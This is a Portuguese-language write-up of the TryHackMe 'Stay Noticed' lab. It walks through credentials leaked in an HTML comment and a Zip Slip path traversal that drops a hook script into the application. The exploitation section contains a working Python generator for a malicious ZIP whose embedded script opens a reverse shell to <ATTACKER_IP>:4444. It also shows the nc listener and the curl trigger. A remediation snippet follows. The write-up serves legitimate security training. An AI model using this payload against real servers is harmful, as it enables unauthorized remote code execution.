# Stay Noticed — TryHackMe

> **Dificuldade:** Médio  
> **Categoria:** Web Exploitation · Directory Traversal · Zip Slip · RCE  
> **Data:** 2025-08-09  
> **Sala:** [https://tryhackme.com/room/staynoticed](https://tryhackme.com/room/hh-thehollowshell-ddb582ac)

---

## overview

Aplicação web Python (Gunicorn) rodando na porta 5000 com um painel de upload de "shells" — arquivos ZIP contendo um manifesto `shell.json` e scripts que disparam ganchos de automação em background. O acesso inicial vem de credenciais vazadas no código-fonte HTML. A exploração principal combina **Directory Traversal com Zip Slip**: um arquivo ZIP forjado a nível de bytes grava um script Python malicioso diretamente na pasta `/hooks/` da aplicação, fora do diretório de isolamento, onde é executado automaticamente pelo backend — estabelecendo um shell reverso.

---

## reconnaissance

```bash
# Varredura de portas
nmap -sV -sC <TARGET_IP>

# Fuzzing de diretórios
dirb http://<TARGET_IP>:5000/ /usr/share/dirb/wordlists/common.txt
```

| porta | serviço | detalhe |
|---|---|---|
| 5000/tcp | http | Python/Gunicorn — redireciona (302) para /login |

Diretórios descobertos pelo Dirb:

```
/login
/dashboard
/upload
```

O redirecionamento 302 para `/login` confirma a existência de um painel autenticado. O `/upload` é o vetor mais interessante — processamento de arquivos do lado do servidor é sempre uma superfície de ataque prioritária.

---

## enumeration

### Revisão do código-fonte — credenciais vazadas

Acessando `/login` no navegador e inspecionando o HTML (`Ctrl+U`), um comentário de desenvolvedor expõe as credenciais de teste:

```html
<!-- default credentials: concierge / StayNoticed2024! -->
```

Information Disclosure clássica — credenciais em bloco de comentário HTML, invisíveis na interface mas completamente acessíveis no source code.

Login via POST com `concierge:StayNoticed2024!` concede acesso ao `/dashboard`.

---

## exploitation

### Zip Slip — Directory Traversal via descompactação

O painel orienta o upload de arquivos ZIP contendo um `shell.json` (manifesto) e scripts que são executados como "automation hooks" pelo backend. A aplicação extrai o ZIP sem sanitizar os caminhos dos arquivos internos — o que abre espaço para **Zip Slip**.

**Como funciona:**

Ao gerar um ZIP com Python, é possível definir manualmente o caminho de destino de cada arquivo interno. Usando sequências `../` no nome do arquivo, o extrator do servidor retrocede na árvore de diretórios — gravando o arquivo fora do subdiretório de isolamento e diretamente em `/hooks/`, de onde a aplicação dispara suas rotinas de automação.

**Script gerador do payload (`gerador_zipslip.py`):**

```python
import zipfile, json

manifest = {"name": "reverse", "assets": []}

callback = '''
import socket, os, pty
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("<ATTACKER_IP>", 4444))
for fd in (0, 1, 2):
    os.dup2(sock.fileno(), fd)
pty.spawn("/bin/bash")
'''

with zipfile.ZipFile("reverse-shell.zip", "w") as z:
    z.writestr("shell.json", json.dumps(manifest))
    z.writestr("../../hooks/callback.py", callback)
```

```bash
python3 gerador_zipslip.py
```

O caminho `../../hooks/callback.py` instrui o extrator a sair do subdiretório de isolamento gerado aleatoriamente (ex: `shells/16ac.../`) e gravar o script diretamente em `/hooks/` — pasta monitorada pelo backend para execução automática.

> **Vulnerabilidade:** Zip Slip — Directory Traversal via descompactação (CWE-22)  
> **Causa raiz:** Ausência de sanitização dos caminhos internos do ZIP antes da extração. Os caracteres `../` não são filtrados, permitindo escrita arbitrária de arquivos fora do diretório designado.  
> **MITRE ATT&CK:** T1083 — File and Directory Discovery / T1059 — Command and Scripting Interpreter

### Entrega do payload e execução

**Listener:**

```bash
nc -lnvp 4444
```

**Upload do arquivo malicioso:**

O arquivo `reverse-shell.zip` é enviado via interface web. O upload utiliza codificação `multipart/form-data`, garantindo que nenhum byte do arquivo compactado seja corrompido em trânsito.

**Acionamento do hook:**

```bash
curl http://<TARGET_IP>:5000/shells/<id>/shell.json
```

Acessar a rota força o backend a processar o manifesto e executar o `callback.py` gravado em `/hooks/`. O script abre uma conexão TCP de volta para o listener na porta 4444, duplica os descritores de arquivo (`os.dup2`) e spawna uma shell interativa com `pty.spawn("/bin/bash")`.

---

## flags

```bash
# No shell reverso:
cat /home/*/flag.txt
```

O curinga `*` instrui o sistema a buscar `flag.txt` em todos os diretórios de usuário sob `/home/` — eliminando a necessidade de adivinhar o nome do usuário local.

```
THM{CENSURADO}
```

---

## attack chain

```
Nmap → porta 5000 (Gunicorn) · redirecionamento 302 para /login
          │
          ▼
Dirb → /login · /dashboard · /upload
          │
          ▼
Source code /login → comentário HTML → concierge / StayNoticed2024!
          │
          ▼
POST /login → acesso autenticado → /dashboard
          │
          ▼
/upload → ZIP com shell.json + automation hooks
          │
          ▼
Zip Slip: ../../hooks/callback.py dentro do ZIP
          │
          ▼
python3 gerador_zipslip.py → reverse-shell.zip
          │
          ▼
nc -lnvp 4444 (listener)
          │
          ▼
Upload via multipart/form-data → extração no servidor
          │
          ▼
curl /shells/<id>/shell.json → backend executa callback.py
          │
          ▼
Shell reverso → TCP → porta 4444
          │
          ▼
cat /home/*/flag.txt → THM{CENSURADO}
```

---

## what I learned

O Zip Slip é uma vulnerabilidade que parece obscura mas é surpreendentemente comum em aplicações que processam arquivos compactados sem validação adequada. O ponto crítico é que os utilitários de extração da maioria das linguagens **não sanitizam caminhos por padrão** — a responsabilidade de validar recai inteiramente sobre o desenvolvedor.

O que tornou esse ataque possível foi a combinação de três fatores: a aplicação aceitava uploads de ZIP, extraía o conteúdo sem verificar os caminhos internos, e executava automaticamente arquivos depositados em `/hooks/`. Cada um desses comportamentos individualmente seria aceitável — juntos, criaram uma cadeia de RCE completa.

A geração do payload em Python em vez de usar ferramentas prontas foi intencional: utilitários de compactação do sistema operacional frequentemente limpam ou normalizam os caracteres `../` automaticamente. Manipular os metadados do ZIP diretamente via código é a única forma garantida de preservar o path traversal no arquivo final.

O `cat /home/*/flag.txt` também foi um bom lembrete: quando você não sabe o nome do usuário alvo, coringas evitam tentativa e erro desnecessária.

**Remediação:**

```python
# Inseguro — extração direta sem validação
zip_ref.extractall(destination)

# Correto — sanitizar cada caminho antes de extrair
import os

def safe_extract(zip_file, destination):
    for member in zip_file.namelist():
        member_path = os.path.realpath(os.path.join(destination, member))
        if not member_path.startswith(os.path.realpath(destination)):
            raise Exception(f"Zip Slip detectado: {member}")
    zip_file.extractall(destination)
```

Além disso: nunca executar automaticamente arquivos provenientes de uploads de usuários sem validação rigorosa de conteúdo e origem.
